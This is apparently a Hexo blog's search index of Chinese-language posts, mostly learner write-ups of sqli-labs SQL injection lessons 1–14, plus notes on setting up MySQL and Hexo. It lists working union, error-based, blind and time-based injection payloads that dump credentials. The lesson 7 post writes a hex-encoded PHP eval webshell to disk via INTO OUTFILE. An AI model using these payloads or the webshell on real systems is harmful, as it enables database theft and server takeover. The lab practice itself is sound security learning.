<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>sqli-labs-les14</title>
      <link href="/2019/07/29/sqli-labs-les14/"/>
      <url>/2019/07/29/sqli-labs-les14/</url>
      
        <content type="html"><![CDATA[<h1 id="题目-POST-Double-injection-Single-quotes-String-with-twist"><a href="#题目-POST-Double-injection-Single-quotes-String-with-twist" class="headerlink" title="题目:POST-Double-injection-Single quotes-String-with twist"></a>题目:POST-Double-injection-Single quotes-String-with twist</h1><p>题目好像跟les13的题目是一样的,但查询语句是不同的</p><a id="more"></a><p>试了几遍单引号和双引号都不行,投降查看源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$uname=&apos;&quot;&apos;.$uname.&apos;&quot;&apos;;</span><br><span class="line"></span><br><span class="line">$passwd=&apos;&quot;&apos;.$passwd.&apos;&quot;&apos;; </span><br><span class="line"></span><br><span class="line">@$sql=&quot;SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><p>观察了一下是在uname和passwd的基础上两边都加’”(一个单引号一个双引号)<br>故payload为 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;&quot; 语句 #</span><br></pre></td></tr></table></figure><h1 id="库名"><a href="#库名" class="headerlink" title="库名"></a>库名</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;&quot; union select count(*),concat(0x7e,database(),0x7e,floor(rand(14)*2))as a from informaition_schema.tables group by a #</span><br></pre></td></tr></table></figure><h1 id="表名"><a href="#表名" class="headerlink" title="表名"></a>表名</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;&quot; union select count(*),concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e,floor(rand(14)*2))as a from information_schema.tables group by a #</span><br></pre></td></tr></table></figure><h1 id="列"><a href="#列" class="headerlink" title="列"></a>列</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;&quot; union select count(*),concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;),0x7e,floor(rand(14)*2))as a from information_schema.tables group by a #</span><br></pre></td></tr></table></figure><h1 id="值"><a href="#值" class="headerlink" title="值"></a>值</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;&quot; union select count(*),concat(0x7e,(select group_concat(username) from users),0x7e,floor(rand(14)*2))as a from information_schema.tables group by a #</span><br></pre></td></tr></table></figure><p>这里跟les13一样都变成logged in successfully了…</p>]]></content>
      
      
      <categories>
          
          <category> sqli-labs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>no-privileges-on-mysql</title>
      <link href="/2019/07/28/no-privileges-on-mysql/"/>
      <url>/2019/07/28/no-privileges-on-mysql/</url>
      
        <content type="html"><![CDATA[<h1 id="在Ubuntu18-04上搭建sqli-labs遇到的问题"><a href="#在Ubuntu18-04上搭建sqli-labs遇到的问题" class="headerlink" title="在Ubuntu18.04上搭建sqli-labs遇到的问题"></a>在Ubuntu18.04上搭建sqli-labs遇到的问题</h1><h2 id="普通用户无权限登录MySQL-修改加密方式"><a href="#普通用户无权限登录MySQL-修改加密方式" class="headerlink" title="普通用户无权限登录MySQL,修改加密方式"></a>普通用户无权限登录MySQL,修改加密方式</h2><p>安装好环境后,把sqli-labs-master文件夹放到/var/www/html里,本以为万事大吉可以开始玩injection了<br>怎料显示个</p><blockquote><p>Access denied for user ‘root’@’localhost’</p></blockquote><a id="more"></a><p>立马<a href="https://blog.csdn.net/weixin_41115274/article/details/78974472" target="_blank" rel="noopener">搜索一波–weixin_41115274-[CSDN]</a><br>发现是安装环境的时候埋下的祸根<br>马上搜索如何解决</p><ul><li>su了之后登录MySQL</li><li>select user, plugin from mysql.user;</li><li>可以看到root在plugin这一项是auto_socket,其他的都是mysql_native_password,此时需要把auto_socket改为mysql_native_password</li><li>语句1:update mysql.user set authentication_string=PASSWORD(‘123456’),plugin=’mysql_native_password’ where user=’root’;<br>flush privileges;清缓存</li><li>语句2:mysql&gt; ALTER USER ‘root’@’%’ IDENTIFIED WITH mysql_native_password BY ‘123456’;<br>(我用的是语句2)</li></ul><p><a href="https://blog.csdn.net/bingjianIT/article/details/82780535" target="_blank" rel="noopener">语句1–codekongs-[CSDN]</a><br><a href="https://blog.csdn.net/weixin_41725862/article/details/88045476" target="_blank" rel="noopener">语句2–行走的猪蹄子-[CSDN]</a></p><h1 id="在Ubuntu18-04搭建网站遇到的问题"><a href="#在Ubuntu18-04搭建网站遇到的问题" class="headerlink" title="在Ubuntu18.04搭建网站遇到的问题"></a>在Ubuntu18.04搭建网站遇到的问题</h1><p>作为一名超级新的萌新,以前搭站都是在Windows利用phpstudy搭的…<br>后来被师傅劝告在虚拟机上搭会比较好<br>因此学习一下怎样在虚拟机上搭站<br><a href="https://blog.csdn.net/timothy93bp/article/details/77530555" target="_blank" rel="noopener">MySQL+php7.0</a><br><a href="https://blog.csdn.net/qq_42280544/article/details/83904046" target="_blank" rel="noopener">MySQL+php5.6</a><br>为了省事我全用root来跟步骤…可能因为这样导致后来需要给权限才能正常工作</p><ul><li><p>给一个文件夹及其子文件777权限:</p><blockquote><p>chmod -r 777 文件夹名</p></blockquote></li><li><p>导入数据库:</p><blockquote><p>mysql -uroot -p 库名 &lt; xxx.sql</p></blockquote></li></ul>]]></content>
      
      
      <categories>
          
          <category> keng </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs-les13</title>
      <link href="/2019/07/27/sqli-labs-les13/"/>
      <url>/2019/07/27/sqli-labs-les13/</url>
      
        <content type="html"><![CDATA[<h1 id="题目-POST-Double-injection-Single-quotes-String-with-twist"><a href="#题目-POST-Double-injection-Single-quotes-String-with-twist" class="headerlink" title="题目:POST-Double injection-Single quotes-String with twist"></a>题目:POST-Double injection-Single quotes-String with twist</h1><p>看题目已经知道是带括号的单引号的查询语句</p><a id="more"></a><h1 id="猜语句"><a href="#猜语句" class="headerlink" title="猜语句"></a>猜语句</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username:&apos;</span><br></pre></td></tr></table></figure><img src="/2019/07/27/sqli-labs-les13/error.png" title="error"><p>所以查询语句为:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT username, password FROM users WHERE username=(&apos;$uname&apos;) and password=(&apos;$passwd&apos;) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><p>然而如果像les12一样输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username:&apos;) union select 1,2#</span><br></pre></td></tr></table></figure><p>会变成这样👇</p><img src="/2019/07/27/sqli-labs-les13/successfully.png" title="successfully logged in"><p>但是这样并没有像les12一样显示出username:1   password:2</p><p>所以要从另一个角度看,题目说着是double injection,那就来double injection的操作吧</p><p>复习一下double injection需要用到的函数:</p><blockquote><p>rand() 生成一个0-1的随机数<br>floor()取整<br>count()统计查询对象的总数<br>group by x 按x对查询结果进行分组</p></blockquote><p>具体原理可以看一下付杰博客的<a href="https://www.fujieace.com/penetration-test/sql-double-injection.html" target="_blank" rel="noopener">SQL双查询注入详解</a></p><h1 id="库名"><a href="#库名" class="headerlink" title="库名"></a>库名</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;) union select count(*),concat(&apos;*&apos;,database(),&apos;*&apos;,floor(rand(14)*2))as a from information_schema.tables group by a #</span><br></pre></td></tr></table></figure><h1 id="表名"><a href="#表名" class="headerlink" title="表名"></a>表名</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;) union select count(*),concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e,floor(rand(14)*2))as a from information_schema.tables group by a #</span><br></pre></td></tr></table></figure><h1 id="列"><a href="#列" class="headerlink" title="列"></a>列</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;) union select count(*),concat(&apos;*&apos;,(select group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;),&apos;*&apos;,floor(rand(14)*2))as a from information_schema.tables group by a #</span><br></pre></td></tr></table></figure><h1 id="值"><a href="#值" class="headerlink" title="值"></a>值</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;) union select count(*),concat(&apos;*&apos;,(select group_concat(username) from users),&apos;*&apos;,floor(rand(6)*2))as a from information_schema.columns group by a #</span><br></pre></td></tr></table></figure><p>有问题,这个会变成logged in successfully,而没有报错因此得不到数据</p>]]></content>
      
      
      <categories>
          
          <category> sqli-labs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs_les12</title>
      <link href="/2019/07/27/sqli-labs-les12/"/>
      <url>/2019/07/27/sqli-labs-les12/</url>
      
        <content type="html"><![CDATA[<h1 id="猜语句"><a href="#猜语句" class="headerlink" title="猜语句"></a>猜语句</h1><blockquote><p>username:1’</p></blockquote><p>failed,没有报错</p><blockquote><p>username:1”</p></blockquote><p>这下有显示报错了</p><a id="more"></a><img src="/2019/07/27/sqli-labs-les12/error.png" title="error"><p>这下知道了查询语句为👇</p><blockquote><p>$sql=”SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1”;</p></blockquote><h1 id="猜列数"><a href="#猜列数" class="headerlink" title="猜列数"></a>猜列数</h1><blockquote><p>“) order by 3#也像les11一样是不存在第三列的</p></blockquote><h1 id="其他步骤"><a href="#其他步骤" class="headerlink" title="其他步骤"></a>其他步骤</h1><p>就跟<a href="https://ocgittt.github.io/2019/07/25/sqli-labs-les11/">les11</a>一模一样了</p><p>les12[完]</p>]]></content>
      
      
      <categories>
          
          <category> sqli-labs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>blogs from wordpress to hexo</title>
      <link href="/2019/07/27/blogs-from-wordpress-to-hexo/"/>
      <url>/2019/07/27/blogs-from-wordpress-to-hexo/</url>
      
        <content type="html"><![CDATA[<p>作为一名零氪党,受不了wordpress的慢速后,将小站转移到hexo阵营</p><a id="more"></a><p>下面是将wordpress的文章转移到hexo上的步骤</p><ul><li>wordpress:导出文章</li><li>hexo:安装插件👇<blockquote><p>npm install hexo-migrator-wordpress –save</p><blockquote><p>如果报错:<br>npm WARN deprecated <a href="mailto:left-pad@1.3.0" target="_blank" rel="noopener">left-pad@1.3.0</a>: use String.prototype.padStart()</p><blockquote><p>则改成淘宝源<br>先改成淘宝源npm config set registry <a href="https://registry.npm.taobao.org" target="_blank" rel="noopener">https://registry.npm.taobao.org</a><br> 再安装一遍npm install hexo-migrator-wordpress –save<br> 然后会提示要安装eslint<br> 于是安装eslintnpm install eslint –save<br> 这时会提示要安装acorn<br> 继续安装acornnpm install acorn –save<br> 这个时候再重新安装一次migrator</p></blockquote></blockquote></blockquote></li></ul><ul><li>导入文章👇<blockquote><p>hexo migrate wordpress &lt;source&gt;</p></blockquote></li></ul><p><a href="https://www.jianshu.com/p/75989cd399a6" target="_blank" rel="noopener">jsyzchen-简书</a><br><a href="https://segmentfault.com/q/1010000019471594" target="_blank" rel="noopener">jokrface的回答-segmentfault</a></p>]]></content>
      
      
      <categories>
          
          <category> keng </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>本地图片显示不出来的解决方案</title>
      <link href="/2019/07/27/%E6%9C%AC%E5%9C%B0%E5%9B%BE%E7%89%87%E6%98%BE%E7%A4%BA%E4%B8%8D%E5%87%BA%E6%9D%A5%E7%9A%84%E5%9D%91/"/>
      <url>/2019/07/27/%E6%9C%AC%E5%9C%B0%E5%9B%BE%E7%89%87%E6%98%BE%E7%A4%BA%E4%B8%8D%E5%87%BA%E6%9D%A5%E7%9A%84%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<h1 id="刚开始用hexo遇到的坑之一-hexo显示不了本地图片"><a href="#刚开始用hexo遇到的坑之一-hexo显示不了本地图片" class="headerlink" title="刚开始用hexo遇到的坑之一:hexo显示不了本地图片"></a>刚开始用hexo遇到的坑之一:hexo显示不了本地图片</h1><p>刚开始用hexo写blog,不是很懂markdown,也不是很懂hexo的markdown.</p><p>用markdown语法的! [ ] ( )来po图,写的时候是可以看见的,但generate上hexo就不行了…</p><a id="more"></a><p>搜索了一下发现<a href="http://www.dongcoder.com/detail-1269676.html" target="_blank" rel="noopener">要这样操作</a></p><ul><li>装插件👇<blockquote><p>npm install <a href="https://github.com/7ym0n/hexo-asset-image" target="_blank" rel="noopener">https://github.com/7ym0n/hexo-asset-image</a> –save</p></blockquote></li><li>把_config.yml里面的post_asset_folder改为<strong>true</strong>(这样的话每当hexo new 一个新.md文件的同时,会在[layout]新建一个同名的文件夹以用来存放资料)</li><li>用这样的标签来插入图片👇<blockquote><p>{ % asset_img 图片的名称+后缀(图片的相对路径) 对图片的解释% }</p></blockquote></li></ul>]]></content>
      
      
      <categories>
          
          <category> keng </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs-master_les11</title>
      <link href="/2019/07/25/sqli-labs-les11/"/>
      <url>/2019/07/25/sqli-labs-les11/</url>
      
        <content type="html"><![CDATA[<h1 id="sqli-labs-master-les11-POST-Error-Based-Single-quotes-String"><a href="#sqli-labs-master-les11-POST-Error-Based-Single-quotes-String" class="headerlink" title="sqli-labs-master les11:POST-Error Based-Single quotes-String"></a>sqli-labs-master les11:POST-Error Based-Single quotes-String</h1><img src="/2019/07/25/sqli-labs-les11/start.png" title="start"><a id="more"></a><p>一开始如上图所示.<br>由题得知这是一道POST报错型(单引号那种语句)的题<br>有了前面简单的GET类型的题,那么就先试一下</p><blockquote><p>Username:admin<br>Password:1</p></blockquote><p>然后就</p><img src="/2019/07/25/sqli-labs-les11/failed1.png" title="failed"><!--more--><p>再试试</p><blockquote><p>Username:admin<br>Password:1’ or 1=1 %23</p></blockquote><img src="/2019/07/25/sqli-labs-les11/failed2.png" title="failed"><p>看到报错</p><blockquote><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’ LIMIT 0,1’ at line 1</p></blockquote><p>就知道这#不能用%23了…都是GET顺手的锅都是顺手的锅<br>把%23改为#之后</p><blockquote><p>Username:admin<br>Password:1’ or 1=1#</p></blockquote><img src="/2019/07/25/sqli-labs-les11/successfully.png" title="successfully"><p>然后</p><blockquote><p>1’ order by 3#</p></blockquote><p>报错</p><blockquote><p>1’ order by 2#</p></blockquote><p>没问题,所以只有两列<br>看了一下源码:</p><blockquote><p>$sql=”SELECT username, password FROM users WHERE username=’$uname’ and password=’$passwd’ LIMIT 0,1”;</p></blockquote><p>然而上面所做的…就是我看WP之前所能做的…<br>接下来,<a href="https://blog.csdn.net/qq_28295425/article/details/78905840" target="_blank" rel="noopener">看WP-Recar</a><br>发现原来是可以直接在username闭合然后注释掉后面的语句…我还以为要在password搞</p><blockquote><p>Username:’ union select database(),version()#👇</p></blockquote><img src="/2019/07/25/sqli-labs-les11/dbname&version.png" title="dbname&version"><blockquote><p>Username:’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#👇</p></blockquote><img src="/2019/07/25/sqli-labs-les11/tables.png" title="tables"><blockquote><p>Username:’ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’#👇</p></blockquote><img src="/2019/07/25/sqli-labs-les11/columns.png" title="columns"><blockquote><p>Username:’ union select group_concat(username),group_concat(password)from users#👇</p></blockquote><img src="/2019/07/25/sqli-labs-les11/username&passwd.png" title="username&passwd"><blockquote><p>Username:’ union select 1,group_concat(id)from users#👇</p></blockquote><img src="/2019/07/25/sqli-labs-les11/id.png" title="id"><p>les11[完]–2019-7-26 19:58</p>]]></content>
      
      
      <categories>
          
          <category> sqli-labs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs-master les10:GET-blind-time based -double quotes</title>
      <link href="/2019/07/24/sqli-labs-master-les10get-blind-time-based-double-quotes/"/>
      <url>/2019/07/24/sqli-labs-master-les10get-blind-time-based-double-quotes/</url>
      
        <content type="html"><![CDATA[<p><img src="https://ocbillhome.files.wordpress.com/2019/07/10start.png" alt></p><p>只需把les9的’改为”即可</p><a id="more"></a><pre><code>?id=1&quot; and if(ascii(substr(database(),1,1))=115,sleep(10),null) %23//库名第一位为s?id=1&quot; and if(left(database(),8)=&apos;security&apos;,sleep(10),null) %23//库名为security?id=1&quot; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(10),null) %23//表名第一位为e?id=1&quot; and if(left((select table_name from information_schema.tables where table_schema=database() limit 0,1),5)=&apos;emails&apos;,sleep(10),null) %23//第一个表名为emails?id=1&quot; and if(left((select table_name from information_schema.tables where table_schema=database() limit 3,1),5)=&apos;users&apos;,sleep(10),null) %23//第四个表名为users?id=1&quot; and if(ascii(substr((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),1,1))=105,sleep(10),null) %23//表users第一列第一位为i?id=1&quot; and if(left((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),2)=&apos;id&apos;,sleep(10),null) %23//表users第一列为id?id=1&quot; and if(left((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 1,1),8)=&apos;username&apos;,sleep(10),null) %23//表users第二列为username?id=1&quot; and if(left((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 2,1),8)=&apos;password&apos;,sleep(10),null) %23//表users第三列为password?id=1&quot; and if(ascii(substr((select username from users limit 0,1),1,1))=68,sleep(10),null) %23//username第一个值的第一位为D?id=1&quot; and if(left((select username from users limit 0,1),4)=&apos;Dumb&apos;,sleep(10),null) %23//username第一个值为Dumb</code></pre><p>limit 0,1 从第1条开始,检索1条语句</p><p>limit 1,2 从第2条开始,检索2条语句(检索到第3条)</p>]]></content>
      
      
      <categories>
          
          <category> sqli-labs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs-master les9:GET-blind-time-based-single quotes</title>
      <link href="/2019/07/23/sqli-labs-master-les9get-blind-time-based-single-quotes/"/>
      <url>/2019/07/23/sqli-labs-master-les9get-blind-time-based-single-quotes/</url>
      
        <content type="html"><![CDATA[<p><img src="https://ocbillhome.files.wordpress.com/2019/07/start-1.png" alt></p><p>还是熟悉的界面,please input the ID as parameter with numeric value</p><a id="more"></a><p>题目是<a href="https://www.jianshu.com/p/65f05e7cc957" target="_blank" rel="noopener">时间盲注</a></p><p>时间盲注：界面返回值只有一种,true 无论输入任何值 返回情况都会按正常的来处理。加入特定的时间函数，通过查看web页面返回的时间差来判断注入的语句是否正确。</p><p>果然,无论我输入?id=1也好,?id=1’也罢,?id=1”什么的也都是You’re in……</p><p><img src="https://ocbillhome.files.wordpress.com/2019/07/true.png" alt></p><pre><code>?id=1&apos; and (if(ascii(substr(database(),1,1))&gt;100,sleep(10),null)) %23</code></pre><p>if(语句1,语句2,语句3)语句1正确则执行语句2,否则执行语句3</p><p>sleep(n)将程序hold住n秒</p><p>用left判断一下数据库名是不是security</p><pre><code>?id=1&apos; and (if(left(database(),8)=&apos;security&apos;,sleep(10),null)) %23</code></pre><p><img src="https://ocbillhome.files.wordpress.com/2019/07/image-1.png" alt></p><p>果然加载了10s才加载完成</p><p>然后再构造一个判断表名的</p><pre><code>?id=1&apos; and (if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100,sleep(10),null)) %23</code></pre><p>又加载了10s,把100换成105,很快就加载出来了,看来是false了</p><p>把105换成103,102,101都不行,看来第一位是101了</p><p>对应ASCII码表,101为e,还记得是email</p><pre><code>?id=1&apos; and (if(left((select table_name from information_schema.tables where table_schema=database() limit 0,1),5)=&apos;email&apos;,sleep(10),null)) %23</code></pre><p>果然又要加载10s才行,后面的也是差不多的操作了…手工盲注还是比较的吃力费时的</p>]]></content>
      
      
      <categories>
          
          <category> sqli-labs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs-master les8:blind-boolian-single-quotes-string</title>
      <link href="/2019/07/21/sqli-labs-master-les8blind-boolian-single-quotes-string/"/>
      <url>/2019/07/21/sqli-labs-master-les8blind-boolian-single-quotes-string/</url>
      
        <content type="html"><![CDATA[<p>看题目得知这是一道布尔型盲注的题,首先搜索一下<a href="https://www.jianshu.com/p/f0174ea6c69d" target="_blank" rel="noopener">布尔型盲注</a></p><p>有了前几题的经验直接来看看库名</p><pre><code>?id=1&apos; and left(database(),8)=&apos;security&apos; %23</code></pre><a id="more"></a><p>left ( string, n )        string为要截取的字符串，n(n&gt;0)为截取的长度(从第一个字符串开始)</p><p><img src="https://ocbillhome.files.wordpress.com/2019/07/database-2.png" alt></p><p>看来库名还是security</p><p>再看看表名第一位</p><pre><code>?id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100 %23</code></pre><p>ascii()函数返回字符的ASCII码</p><p>substr(string,start,length)函数/mid(string,start,length)函数:从start位开始截取string,截取length位</p><p>select那个语句最后一定要有limit 0,1</p><p><img src="https://ocbillhome.files.wordpress.com/2019/07/database-3.png" alt></p><p>而100改成101的时候</p><p><img src="https://ocbillhome.files.wordpress.com/2019/07/error.png" alt></p><p>报错,所以表名第一位是e</p><p>然后就是漫长的盲注过程…所以盲注还是适合用脚本来跑,找WP的时候看到<a href="https://blog.csdn.net/weixin_40709439/article/details/81355856" target="_blank" rel="noopener">其中一个WP</a>是有用脚本来跑的</p>]]></content>
      
      
      <categories>
          
          <category> sqli-labs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs-master les7:GET-dump into outfile-string</title>
      <link href="/2019/07/20/sqli-labs-master-les7/"/>
      <url>/2019/07/20/sqli-labs-master-les7/</url>
      
        <content type="html"><![CDATA[<p>看了一下源码,sql查询语句为:</p><pre><code>SELECT * FROM users WHERE id=((&apos;$id&apos;)) LIMIT 0,1</code></pre><a id="more"></a><p>看了一下题目,outfile,<a href="https://www.jianshu.com/p/1f97795443ce" target="_blank" rel="noopener">搜索了一下outfile是怎么回事</a>,然后构造了这样的一个payload</p><pre><code>1&apos;)) select * from users into outfile &apos;D:/software/phpStudy/PHPTutorial/WWW/sqli-labs-master/Less-7/test.txt&apos; %23</code></pre><p>然后…什么事情都没有发生</p><p>–2019.7.20 23:52</p><p>继续，传个一句话木马上去</p><pre><code>id=1&apos;))union select 1,2,(select 0x3C3F70687020406576616C28245F504F53545B276D756D61275D293B203F3E into outfile &apos;D:/software/phpStudy/phpStudy/PHPTutorial/WWW/sqli-labs-master/Less-7/test.php&apos; %23</code></pre><p>不行，看到my.ini里面#secure_file_priv = D:/backup，去掉注释，重启phpstudy进入MySQL命令行</p><p>show variables like ‘secure_file_priv’;</p><p><img src="https://ocbillhome.files.wordpress.com/2019/07/image.png" alt></p><pre><code>然后http://localhost/sqli-labs-master/Less-7/?id=1%27)) union select 1,2,(select 0x3C3F70687020406576616C28245F504F53545B27636D64275D293B203F3E into outfile &quot;D:\\backup\\2.php&quot;) %23</code></pre><p>然后！还是不行。。。暂时跳过，<a href="https://blog.csdn.net/qq_44105778/article/details/86926128" target="_blank" rel="noopener">贴一下我看的WP</a></p><p>–2019.7.21 11:13</p>]]></content>
      
      
      <categories>
          
          <category> sqli-labs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs-master les1-les6</title>
      <link href="/2019/07/17/ctfthe-gamesqli-labs-master/"/>
      <url>/2019/07/17/ctfthe-gamesqli-labs-master/</url>
      
        <content type="html"><![CDATA[<h2 id="basic-challenges-WP1-WP2"><a href="#basic-challenges-WP1-WP2" class="headerlink" title="[basic challenges] WP1 WP2"></a>[basic challenges] <a href="https://bbs.pediy.com/thread-220075.htm" target="_blank" rel="noopener">WP1</a> <a href="https://www.cnblogs.com/peterpan0707007/p/7620048.html" target="_blank" rel="noopener">WP2</a></h2><h3 id="les1-GET-Error-based-Single-quotes-String"><a href="#les1-GET-Error-based-Single-quotes-String" class="headerlink" title="les1:GET-Error based-Single quotes-String"></a>les1:GET-Error based-Single quotes-String</h3><p><img src="https://ocbillhome.files.wordpress.com/2019/07/les1_1.png" alt></p><a id="more"></a><p>看到please input the ID as parameter with numeric value后就GET一个id=1[常规测试]</p><p><img src="https://ocbillhome.files.wordpress.com/2019/07/getid1.png" alt></p><p>有回显,则没毛病,再来个id=1’试试[单引号测试]</p><p><img src="https://ocbillhome.files.wordpress.com/2019/07/getid1-1.png" alt></p><p>竟然都不行,且从报错来看,查询语句是 <strong><code>SELECT * FROM users WHERE id=&#39;1&#39;</code> <code>LIMIT 0,1;</code></strong>这种结构的</p><p>(但是MySQL注释有3种写法①#注释[URL上要用%23注释]②– 注释(注释前面有个空格[URL上要写–%20注释])③/*注释*/[这种要成对出现,注入一般用不上])</p><p>那就试试id=1’ or 1=’1(万能密码之一)</p><p><img src="https://ocbillhome.files.wordpress.com/2019/07/id1or11.png" alt></p><p>有回显…但是这好像没什么卵用,还是用注释的来玩吧</p><p><img src="https://ocbillhome.files.wordpress.com/2019/07/orderby3-a.png" alt></p><p>姿势:?id=1’ order by 3– a或1’ order by 3 %23</p><p><img src="https://ocbillhome.files.wordpress.com/2019/07/orderby4-a.png" alt></p><p>姿势:?id=1’ order by 4– a或1’ order by 4 %23</p><p>3正常而4错误,则表是有3列的</p><p>接下来就要使用union联合查询(法一)</p><p><img src="https://ocbillhome.files.wordpress.com/2019/07/unionselect12323.png" alt></p><p>姿势:?id=0’ union select 1,2,3</p><p>姿势之所以改为id=0而不是继续id=1,是因为id=1或者其他正整数的时候,会有规定的数据取出,查看了dalao的WP发现这是因为在index.php中并没有循环取出数据,因此只要把1改为0或者负数即可.</p><p>由上图可发现只显示出了2,3而1则不知道哪去了…所以我们只能2或3中选一个位置来爆其他信息</p><p><img src="https://ocbillhome.files.wordpress.com/2019/07/dbversion.png" alt></p><p>姿势:?id=0’ union select 1,database(),version() %23</p><p>database():返回当前数据库连接使用的数据库</p><p>version(): 返回当前数据库的版本</p><p><strong>爆表:</strong></p><p><img src="https://ocbillhome.files.wordpress.com/2019/07/tables.png" alt></p><p>姿势:?id=0’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() %23</p><p>还有dalao秀了一波报错型注入(法二)?id=1’ and 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) –+</p><p><img src="https://ocbillhome.files.wordpress.com/2019/07/xpath.png" alt></p><p>姿势:?id=1’ and 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) –+<br>这id=1好像不怎么影响???</p><p>爆出的表有emails,referers,uagents,users</p><p><strong>爆列(字段):</strong></p><p><img src="https://ocbillhome.files.wordpress.com/2019/07/columns.png" alt></p><p>姿势:?id=0’ union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’users’ %23</p><p><img src="https://ocbillhome.files.wordpress.com/2019/07/xpathcolumns.png" alt></p><p>姿势: ?id=0’ and 1=extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=’users’))) –+</p><p>爆出users表中的列(字段)有id,username和password</p><p>where语句等号后面的值不能纯英文,比如users需要用’users’单引号,或者使用users的十六进制where=0x7573657273</p><p><strong>爆值:</strong></p><p><img src="https://ocbillhome.files.wordpress.com/2019/07/usernamepasswd.png" alt></p><p>姿势:?id=0’ union select 1,concat(username,0x26,password),3 from users %23</p><p><img src="https://ocbillhome.files.wordpress.com/2019/07/zhi.png" alt></p><p>姿势:id=0’ and 1=extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users))) –+</p><p>爆出username和password的值,我用的符号是&amp;,即username&amp;password是一组</p><p>les1[完]</p><h3 id="les2-GET-Error-based-Intiger-based"><a href="#les2-GET-Error-based-Intiger-based" class="headerlink" title="les2:GET-Error based -Intiger based"></a>les2:GET-Error based -Intiger based</h3><p>开头跟les1一样,GET一个id=1,有回显,id=1’同样跟les1错误</p><p>但是id=1’ %23的时候,les1是正常的,les2却是错误</p><p>所以猜测查询语句为 <strong><code>SELECT * FROM users WHERE id=</code> <code>LIMIT 0,1;</code></strong></p><p>因此可以直接union查询试试是不是其他全都跟les1一样?id=1 union select 1,2,3</p><p><img src="https://ocbillhome.files.wordpress.com/2019/07/unionselect123.png" alt></p><p>发现这跟les1一模一样,直接爆表走起</p><p><img src="https://ocbillhome.files.wordpress.com/2019/07/tables-1.png" alt></p><p><img src="https://ocbillhome.files.wordpress.com/2019/07/usernamepasswd-1.png" alt></p><p>以上姿势跟les1差不多,只需去掉单引号’和最后的%23注释符/–+</p><p>les2[完]</p><h3 id="les3-GET-Error-based-Single-quotes-with-twist-String"><a href="#les3-GET-Error-based-Single-quotes-with-twist-String" class="headerlink" title="les3:GET-Error based Single quotes with twist-String"></a>les3:GET-Error based Single quotes with twist-String</h3><p><img src="https://ocbillhome.files.wordpress.com/2019/07/start.png" alt></p><p>常规操作后,猜测语句是这样的: <strong><code>SELECT * FROM users WHERE 